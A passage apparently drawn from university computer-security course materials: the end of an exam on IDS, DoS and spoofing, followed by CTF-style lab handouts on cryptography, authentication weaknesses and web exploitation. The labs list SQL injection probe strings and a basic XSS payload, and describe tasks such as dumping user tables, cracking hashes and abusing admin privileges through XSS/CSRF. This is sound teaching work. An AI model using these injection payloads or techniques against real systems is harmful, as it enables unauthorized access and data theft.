making promiscuous capture of packets more difficult.
Switches automatically decrypt all packets at layer
2.
Hub-based LANs are usually physically protected and
cannot be tapped.
3
–
–
–
–
Switches seldom store ARP entries in memory.
9. How does DNS cache poisoning enable an attacker to redirect
user traffic?
By substituting a malicious local hosts file on the
client
By manipulating the user’s private IP address to MAC
address mapping
By inserting false name-to-IP mappings in a DNS
resolver’s cache
By encrypting DNS queries end-to-end
10. Which scenario best represents ARP spoofing on a LAN?
An attacker forges IP source addresses in TCP packets
destined for a remote host.
An attacker sends unsolicited ARP replies claiming
the gateway’s IP belongs to the attacker’s MAC.
An attacker manipulates DNS queries to point to a
malicious server.
An attacker runs Nmap to scan open TCP ports.
Part B
1. Detecting DDoS
Question: In large networks, how can an IDS
differentiate between normal traffic spikes (e.g.,
flash crowds) and an actual DDoS? Describe two advanced
techniques or heuristics an IDS might employ.
2. Base Rate Fallacy
Question: Suppose an anomaly-based IDS has a 1% false
positive rate and 95% detection rate, but actual
intrusions happen only once per 10,000 events.
Calculate conceptually how many false alarms vs. real
alarms to expect in 100,000 events. Explain why the
result might be problematic for analysts.
3. Signature vs. Anomaly
Question: Compare two real-world scenarios—one ideally
suited for signature-based detection and another for
anomaly-based detection. Justify why each approach fits
the scenario.
4. Specification-Based IDS Complexity
Question: Why can specification-based IDS be labor-
intensive? Give one example of a complex system or
4
–
–
–
–
–
–
–
protocol where writing a correct specification is
challenging.
5. Vulnerability Scanners
Question: Outline how a vulnerability scanner like
Nessus or OpenVAS might systematically check for known
security holes. Mention two limitations or risks of
relying on such automated scans.
6. Mitigating ARP Spoofing
Question: In a large corporate LAN, how might network
admins reduce ARP spoofing attacks? Discuss two
solutions and potential drawbacks.
7. DNS Cache Poisoning
Question: Provide one attacker method for DNS cache
poisoning (without DNSSEC) and two countermeasures that
resolvers or OSes can implement.
8. SYN Flooding
Question: Summarize how a classic SYN flood can cause a
DoS and explain how SYN cookies specifically mitigate
the resource exhaustion problem.
9. Smurf/Amplification
Question: The Smurf attack is an older but instructive
example of ICMP-based amplification. If an attacker can
produce an amplified factor of 100, how does that
occur, and how do modern networks mitigate it?
10. IDS Evasion
Question: Attackers can craft packets or flows to evade
detection by certain IDS. Give two examples of evasion
techniques and how modern IDS might counter them.
Part C
1. False Positives and Negatives
Question: You have an IDS with a 2% false positive rate
(FPR) and 90% detection rate (true positive rate). Each
day there are 200 real intrusions and 10,000 non-
intrusive events.
1. How many false negatives occur daily?
2. How many false positives?
5
–
–
–
2. Anomaly Alert Volume
Question: An anomaly-based IDS sees 1 million
events/day, among which only 200 are actual attacks.
Suppose it catches 90% of these attacks but triggers
alarms on 2% of benign events.
1. How many total alarms?
2. How many of these alarms correspond to real
attacks?
3. Base Rate
Question: If an IDS is 99% accurate (meaning for any
event, it has a 1% chance to misclassify), but actual
intrusions are 0.1% of all events, what is the
probability an alarm is a real intrusion? (Hint: apply
Bayes’ Theorem or conceptual reasoning.)
4. DoS Bandwidth
Question: An attacker floods 100,000 pps at 512 bytes
each.
1. What is the approximate bandwidth of this DoS in
Mbps?
2. If the target’s uplink is 100 Mbps, can this alone
saturate the link (assuming no overhead)?
```

## lab1.pdf

[lab1.pdf](/Users/davidwickerhf/Downloads/Computer Security/lab1.pdf)

```text
Confidentiality?
What This Lab Is About
This lab is designed to test and strengthen your understanding of core cryptography ideas
introduced in:
• Lecture 1: Fundamentals of Computer Security
• Lecture 2: Foundations of Cryptography
In Lecture 1, we discussed that one of the fundamental goals of computer security is confi-
dentiality, i.e., keeping non-public information accessible only to authorized parties, and that
encryption is one of the key tools used to support confidentiality.
In Lecture 2, we introduced the basic model of encryption and decryption:
• Encryption transforms plaintext into ciphertext to provide confidentiality
• Decryption reverses that transformation using a key
We also defined the key terms plaintext, ciphertext, and encryption/decryption keys .
This lab uses small, readable examples so you can practice recognizing transformations and
reasoning about why some approaches are weak.
Learning Objectives
By completing this lab, you should be able to:
1. Explain confidentiality and why cryptography helps
• Connect confidentiality (Lecture 1) to encryption as a protection mechanism.
2. Use the plaintext/ciphertext model correctly
• Identify what is plaintext vs. ciphertext, and what “recovering plaintext” means in
practice.
1
3. Reason about security of a cipher using key space
• Understand why small key spaces make brute-force (exhaustive key search) feasible.
4. Adopt an attacker’s viewpoint
• Practice “ciphertext-only” style thinking: given only transformed text, how could
the original be recovered?
Challenge 1: Multi-step Transformations
Scenario
You are given a text file ( output.txt) containing five lines. Each line is produced by applying
a different transformation to one part of a hidden flag.
Your Task
1. Identify what kind of transformation each line uses.
2. Reverse each transformation.
3. Reconstruct the original flag by putting the pieces together in order.
Takeaways
• Recognizing the difference between encryption-like transformations and encodings/repre-
sentations.
• How small key spaces make exhaustive key search feasible.
• Why certain simple transformations do not provide real confidentiality.
Questions to Consider
• Which lines were actually encrypted, and which were just encoded?
• How does key space size affect the difficulty of reversing a transformation?
• Why does reversing these transformations not require breaking strong cryptography?
2
Challenge 2: One-Time Pad Misuse
Scenario
You are given a file called otp_challenge.txt containing a known plaintext, its ciphertext,
and a second ciphertext encrypting a secret flag. Both ciphertexts use the same XOR-based
pad (key).
Your Task
1. Use the known plaintext and ciphertext to recover the pad.
2. Apply the pad to the second ciphertext.
3. Recover the hidden flag from the result.
Takeaways
• OTP reuse breaks confidentiality even though OTP is theoretically secure.
• XOR properties can be exploited in known-plaintext attacks.
• The importance of correct cryptographic usage over algorithm choice.
Questions to Consider
• Why does XORing two ciphertexts eliminate the key in OTP reuse?
• What conditions are required for OTP to be perfectly secure?
• How does a known-plaintext attack enable flag recovery in this scenario?
Challenge 3: The Penguin
Scenario
You are given a file called flag.dat containing encrypted and encoded data. The file preserves
some structure from the original plaintext.
3
Your Task
1. Determine how the data was encoded or transformed.
2. Reverse the transformation of the data.
3. Discover the original file format.
4. Recover the hidden flag.
Takeaways
• Encryption that handles blocks independently can leak structural information.
• Patterns in data may survive encryption, highlighting practical confidentiality limitations.
• Encoding alone does not provide security; encryption must be applied carefully.
Questions to Consider
• Why can independent block processing leak structure?
• What type of information can an attacker infer without decrypting?
• Why is encoding not equivalent to encryption?
Challenge 4: Modified Vigenère Cipher
Scenario
You are given a ciphertext produced using a modified Vigenère cipher. The key length is 4,
with only the last key character unknown. Plaintext is all uppercase letters.
Your Task
1. Use the known key length and known key characters to narrow down possibilities.
2. Reason about the effect of the positional drift applied during encryption.
3. Recover the unknown key characters.
4. Decrypt the ciphertext to recover the original plaintext.
Takeaways
• Short, partially known keys are vulnerable even with small modifications.
• Deterministic transformations do not prevent cryptanalysis.
• Classical ciphers fail against attackers with partial knowledge.
4
Questions to Consider
• How does partial knowledge of a key reduce the effective key space?
• Why does a short key make polyalphabetic ciphers weak?
• How can predictable positional modifications be exploited?
Challenge 5: The Generator of Keys
Scenario
You are given a compiled binary called program and a server using the same validation logic.
You can submit strings to the server, which returns the flag only if the key is valid.
Your Task
1. Analyze the binary using reverse engineering tools such as Binary Ninja or Ghidra.
2. Identify constraints imposed on the key (such as length, character restrictions, or rela-
tionships between characters).
3. Use these constraints to significantly reduce the key search space.
4. Generate a key that satisfies all validation checks (e.g., via a simple key search or scripted
generator).
Takeaways
• Custom cryptographic validation is risky and often insecure.
• Reverse engineering closed-source binaries can reveal critical information.
• Small or structured key spaces are exploitable.
• Security through obscurity is ineffective; real cryptography relies on well-analyzed primi-
tives.
Questions to Consider
• Why is security through obscurity considered ineffective?
• How can reverse engineering reveal key validation rules?
• How does key space structure affect attack feasibility?
• Why is custom key validation generally discouraged in cryptography?
5
```

## lab2.pdf

[lab2.pdf](/Users/davidwickerhf/Downloads/Computer Security/lab2.pdf)

```text
Confidentiality and Authentication?
What This Lab Is About
This lab is designed to test and strengthen your understanding of authentication vulnerabilities
and cryptographic weaknesses introduced in:
•Lecture 3: Authentication Methods
•Lecture 4: Protocols for Secure Communication
•Lecture 5: Securing Web Applications
In Lecture 3, we discussed authentication mechanisms including password storage, hashing,
and common attacks like dictionary and offline cracking. Lecture 4 covered protocols for secure
communication and key establishment. Lecture 5 focused on web application security challenges.
This lab uses realistic web challenges to demonstrate how poor implementation of authentication
leads to compromise. You’ll practice identifying vulnerabilities, exploiting weak cryptography,
and understanding why common practices fail.
Learning Objectives
By completing this lab, you should be able to:
1. Identify client-side vs server-side validation flaws in web applications.
2. Recognize oversharing risks and predictable password patterns.
3. Detect information leakage through HTTP headers and network traffic.
4. Exploit truncated hash collisions and understand MD5 weaknesses.
5. Perform password cracking using tools like John the Ripper on leaked database hashes.
Challenge 1: Insecure Login
Scenario
A web application checks for admin credentials to log into an account. Passwords are generated
dynamically, so the users and passwords are not the same. However, some of the developers
have made a crucial error that they forgot about before pushing the final version. It’s your task
to find that.
Your Task
1. Inspect the contents of the website.
2. Figure out where you can find some hidden information in the files.
Takeaways
•Client-side validation provides no real security.
•Secrets can accidentally be leaked by developers.
Questions to Consider
•What could developers leave accidentally that would cause such a data breach?
1
Challenge 2: TMI on Social Media
Scenario
A user’s social media profile reveals personal details that exactly match their password con-
struction pattern. The password follows a predictable formula based on public posts.
Your Task
1. Analyze the profile page and extract key personal information.
2. Deduce the password construction order from available hints.
3. Construct the password and authenticate to the application.
4. Retrieve the flag from the authenticated session.
Takeaways
•Oversharing enables password reconstruction attacks.
•Predictable password formulas undermine security regardless of complexity.
•Social engineering combines with technical analysis.
Questions to Consider
•How does password policy fail when patterns are public?
•Why are date-based and pet-name patterns particularly vulnerable?
•Connect this to dictionary attacks from Lecture 3.
Challenge 3: Single Sign-On Secret Header
Scenario
An SSO/2FA implementation leaks one-time codes. The code is transmitted in plain text,
allowing interception and reuse.
Your Task
1. Submit initial credentials and capture the HTTP response.
2. Extract the leaked SSO code from response headers.
3. Reuse the code to complete authentication as admin.
4. Access the admin panel to retrieve the flag.
Takeaways
•HTTP headers are visible to anyone inspecting traffic.
•One-time codes must use secure channels (not custom headers).
•Network proxies reveal implementation flaws.
2
Questions to Consider
•Why do custom headers fail as secure 2FA channels?
•How does this violate confidentiality from Lecture 1?
•What protocol from Lecture 4 could prevent header leakage?
Challenge 4: MD5 Truncated-Hash Collision
Scenario
A server validates integrity using only the first 7 hex characters of MD5 hashes. You must find
a collision against a secret reference without seeing the full message.
Your Task
1. Connect to the service and note the required prefix and target hash.
2. Write a brute-force script to find colliding suffixes.
3. Submit the colliding input to receive the flag.
Takeaways
•Truncating hashes drastically reduces security (28-bit effective strength).
•MD5 collisions are computationally feasible.
•Custom hash validation ignores cryptographic best practices.
Questions to Consider
•Why does 7 hex chars make brute-force viable?
•How does this demonstrate key space analysis from Lecture 2?
•What modern hash function would resist this attack?
Challenge 5: Cracking with John – Web + SQL + Hashes
Scenario
A web app stores hashed passwords in a MySQL database. Database credentials leak through
a misconfigured robots.txt, exposing admin hashes. The list of passwords used for the accounts
has also been leaked, however, do you have the time to go through all of them for each user?
Your Task
1. Discover leaked database credentials.
2. Dump the users table and extract the hashes.
3. Crack admin passwords using John the Ripper with provided wordlist.
4. Authenticate to the web app as admin to get the flag.
3
Takeaways
•Leaked database = game over for weak hashing.
•Date-pattern passwords crack quickly even when salted.
Questions to Consider
•Why does SHA-1 fail despite salting?
•Compare the security of the hash you found to bcrypt/Argon2 from Lecture 3.
•How does database leakage amplify web app risks?
General Security Principles
•Never trust client-side validation or exposed secrets.
•Use proper cryptographic primitives (not custom/truncated hashes).
•Protect all authentication factors through secure channels.
•Store passwords with adaptive, slow hashes (bcrypt, Argon2).
•Assume all overshared info enables targeted attacks.
Tools and Techniques
•Browser Developer Tools (Network/Debugger tabs)
•Intercepting proxies (Burp Suite)
•MySQL client for database dumping
•John the Ripper for password cracking
•Python scripting for hash collision brute-force
•netcat (nc) for TCP services
Flag Format
All flags follow:MaaSec{<16 hex chars> flag}[file:3]
Ethical Reminder
Conduct all exercises ONLY in the provided lab environment. These skills are for defensive
cybersecurity only.
4
```

## lab4.pdf

[lab4.pdf](/Users/davidwickerhf/Downloads/Computer Security/lab4.pdf)

```text
BCS2420
Lab 4: Web Exploitations
Irina Iarlykanova
February 2026
Purpose of These Labs
Welcome to Lab 4! This lab is based on Lecture 6, and today we are going to explore
web applications. While there are specific vulnerabilities in each programming language
that developers should be aware of, there are issues fundamental to the internet that can
appear regardless of the chosen language or framework.
It is almost impossible to solve web-based challenges without using any tools (or at least
very difficult). That’s why in this lab you will be introduced to new tools that you might
have never seen before. But do not worry, we will guide you through them :)
Lastly, make sure you go over Lecture 6 before starting the lab. There will be no challenges
that you cannot solve yourself.Good luck!
Challenge 1: “Subscribe to Read More”
Difficulty:Easy
Narrative Context
You are scrolling throughThe Captivating Capital, a finance magazine for people who say
“summering” as a verb. An article catches your eye:
CookieVault: Inside the $10-Per-Click Game Where Billionaires Burn Money
for Sport
You need to know more about this platform and its players, but to read the article, you
need to pay a lot of money!
Goal:Get the access to the full article by bypassing the paywall.
Key Learning Goals
This challenge introduces the following concepts:
•The Document Object Model (DOM)
•Browser Developer Tools (DevTools)
1
Concepts from Lecture
When you request a webpage, the server sends a copy of the code to your browser, where
it is rendered and displayed. Everything you see in your browser was sent to your machine
first.
Websites are made of:
•Front End (Client-Side)— runs in your browser, renders the webpage, handles
interactions.
•Back End (Server-Side)— runs on the server, processes requests, returns re-
sponses.
Websites are primarily created using HTML, CSS and JavaScript. A web page is a
document that can either be displayed in the browser, or as HTML source code in a
program.The DOM is an object representation of that web page— a programming
interface that enables a scripting language, such as JavaScript, to change the document
structure, style and content of the web page.
Developer Tools (DevTools) is built into every modern browser. It allows you to view and
manipulate the DOM, modify CSS in real time, debug JavaScript, and execute commands
in the console.
For more information on how to use DevTools visit:
https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_
and_setup/What_are_browser_developer_tools
Challenge 2: “The Internet Never Forgets”
Difficulty:Easy
Narrative Context
So now you now, CookieVault, the game where the ultra-rich click a cookie to prove
they’re ultra-rich. You want to see who is playing the game, but there is no sign up. No
waitlist. No "contact us." Just a login form and a wall of exclusivity.
You were not invited, but you can find another way in. Maybe someone got sloppy?
Goal:Find credentials and login with them to retrieve the flag.
Key Learning Goals
This challenge expands upon Challenge 1:
•Hidden but accessible resources
•Git repository metadata recovery
Concepts from Lecture
When you visit a website, your browser requests files from a server. Some of these files
are meant for you to see (HTML pages, images, stylesheets), while others are meant to
2
stay hidden. But “hidden” does not always mean “inaccessible.” If you know what to look
for, you might find files the developer never intended to expose.
There are many such files, but here are the essential ones to know:
File/Directory Purpose Meaning
robots.txtTells search engines
which paths not to index
Often reveals directories the ad-
min wants hidden from Google,
but not protected from direct ac-
cess
.git/Git repository metadata
and history
Full source code and history re-
coverable
.envStores environment vari-
ables (database creden-
tials, API keys, secrets)
Often contains sensitive data in
plaintext
.bak, .old,
.zip
Backup or editor tempo-
rary files
May contain older versions with
hardcoded credentials or vulnera-
bilities
Needed Tools
git-dumper
•Check if it is installed:git-dumper --help
•If you seecommand not found, install using:pip install git-dumper
•For more information:https://github.com/arthaud/git-dumper
Challenge 3: “Feed The Machine”
Difficulty:Medium
Narrative Context
Now that you are inside the CookieVault, you discover that these high-class people have
an unusual hobby: competitive cookie clicking. The game is simple: click the cookie, and
whoever has the most clicks wins the prize. The current leader has 999,999,999 clicks.
Your goal is to claim first place.
Goal:To get the flag, you need to score first on the leaderboard.
Key Learning Goals
This challenge introduces the following concepts:
•HTTP request and response structure
•Session cookies and their role in authentication
•Signed cookies and cryptographic verification
3
Concepts from Lecture
HTTP Basics
When you interact with a website, your browser and the server communicate using HTTP
(Hypertext Transfer Protocol). Every interaction follows a simple pattern:
1.Request:Your browser asks the server for something (a page, an image, or to
submit data)
2.Response:The server replies with the requested content or a status message
A basic HTTP request looks like this:
GET /game HTTP/1.1
Host: example.com
Cookie: player_data=abc123
And a response:
HTTP/1.1 200 OK
Content-Type: text/html
<html>...</html>
Cookies
Cookies are small files of information that a web server generates and sends to a web
browser.
Asession cookiehelps a website track a user’s session. This cookie stores information
such as the user’s input and tracks the movements of the user within the website.
There is also such a thing as asigned session cookie. A signed cookie is a normal HTTP
cookie whose value is accompanied by a cryptographic signature created with a server-side
secret key. It is used so the server can detect tampering and trust the data stored in the
cookie (for things like session or auth info) without storing it all server-side.
Needed Tools
•Browser Developer Tools (F12)
•(Optional)If you feel like a hacker or want to try a new (very popular and widely
used) tool:
–Burp Suite
–Incaseoftroublevisit:https://portswigger.net/burp/communitydownload
Challenge 4: “No Injector Will Pass!”
Difficulty:Medium
4
Narrative Context
Congratulations on scoring first in the previous challenge! I think it was cool, but the
platform’s admins think otherwise... Unfortunately, they deleted your user, banned your
persona and wished to not see you again. It sounds like you need to get someone else’s
account to show them that you are a better hacker than they are programmers.
Goal:To get the flag, you need to login aselan_maks.
Key Learning Goals
This challenge introduces the following concepts:
•Authentication bypass via malicious queries
Concepts from Lecture
Almost no platform operates without a database. You have seen many databases, includ-
ing MySQL, SQLite, MariaDB, MongoDB and many more.
Unfortunately for everyone, databases used to be super insecure. One of the most common
and dangerous issues was (and still is) SQL injection: an attack where an attacker slips
malicious SQL code into a normal input field (like a login form) so the application runs
their query instead of the one the developer intended. In practice, this can let an attacker
read or modify sensitive data, bypass authentication, or even delete whole tables. Modern
applications defend against SQL injection by never concatenating raw user input into
queries, and instead using prepared statements, parameterized queries, and strict input
validation.
Some common SQL queries to test for SQLi:
•Confirm SQLi:
’ OR 1=1--
•Error-Based Column Count:
1’ ORDER BY 1 --
1’ ORDER BY 2 --
•UNION SELECT Discovery:
’ UNION SELECT NULL --
’ UNION SELECT NULL,NULL --
Challenge 5: “Equalizer Weapon”
Difficulty:Hard
Narrative Context
I cannot believe you could fool the admins and get theelan_maksaccount — well done!
It sounds like it is time to end their games and show them what you really think of them
and the system they created.
5
The admins have patched the previous vulnerabilities and added new features to the
platform. Now players can customize their display name! They also monitor the platform
closely, reviewing reported content immediately.
Goal:To get the flag, reset ALL users’ balance and score to 0 by exploiting the admin’s
privileges.
Key Learning Goals
This challenge introduces the following concepts:
•Cross-Site Scripting (XSS)
•Cross-Site Request Forgery (CSRF) and its defenses
•How XSS can bypass CSRF protections
Concepts from Lecture
What is XSS?
Cross-Site Scripting (XSS) allows an attacker to inject malicious JavaScript into a web
page viewed by other users. When the victim’s browser loads the page, the injected script
executes with the same privileges as legitimate scripts.
There are two main types:
•Reflected XSS— payload is part of the request (e.g., URL parameter)
•Stored XSS— payload is saved on the server and served to all users who view the
affected page
Example:
<script>alert(’test’)</script>
What is CSRF?
Cross-Site Request Forgery (CSRF) tricks a victim’s browser into making an unwanted
request to a site where they are authenticated. Typical CSRF defenses include tokens
that verify the request originated from the legitimate site.
6
```
